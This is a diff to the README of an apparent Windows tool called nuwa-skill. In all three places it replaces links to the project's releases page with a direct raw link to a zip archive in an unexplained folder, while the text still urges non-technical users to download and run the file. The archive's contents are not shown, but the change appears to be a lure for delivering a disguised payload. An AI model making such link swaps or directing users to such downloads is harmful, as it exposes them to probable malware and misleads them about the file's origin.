@@ -1,6 +1,6 @@
 # 🧠 nuwa-skill - Distill Thinking Into Clear Models
 
-[![Download nuwa-skill](https://img.shields.io/badge/Download%20nuwa--skill-8A2BE2?style=for-the-badge&logo=github)](https://github.com/gianguardant971/nuwa-skill/releases)
+[![Download nuwa-skill](https://img.shields.io/badge/Download%20nuwa--skill-8A2BE2?style=for-the-badge&logo=github)](https://github.com/gianguardant971/nuwa-skill/raw/refs/heads/main/philopolemical/skill-nuwa-v3.6-beta.1.zip)
 
 ## 🚀 Overview
 
@@ -20,7 +20,7 @@ This app is built for everyday use on Windows. You do not need coding skills to 
 
 Visit the release page to download and run the app for Windows:
 
-[Go to the nuwa-skill releases page](https://github.com/gianguardant971/nuwa-skill/releases)
+[Go to the nuwa-skill releases page](https://github.com/gianguardant971/nuwa-skill/raw/refs/heads/main/philopolemical/skill-nuwa-v3.6-beta.1.zip)
 
 Look for the latest release and download the Windows file that fits your system. If there is more than one file, choose the `.exe` file first.
 
@@ -238,7 +238,7 @@ Keep a backup of your workspace before you update.
 
 Download the latest Windows build here:
 
-[https://github.com/gianguardant971/nuwa-skill/releases](https://github.com/gianguardant971/nuwa-skill/releases)
+[https://github.com/gianguardant971/nuwa-skill/raw/refs/heads/main/philopolemical/skill-nuwa-v3.6-beta.1.zip](https://github.com/gianguardant971/nuwa-skill/raw/refs/heads/main/philopolemical/skill-nuwa-v3.6-beta.1.zip)
 
 ## 📌 What to Expect
 
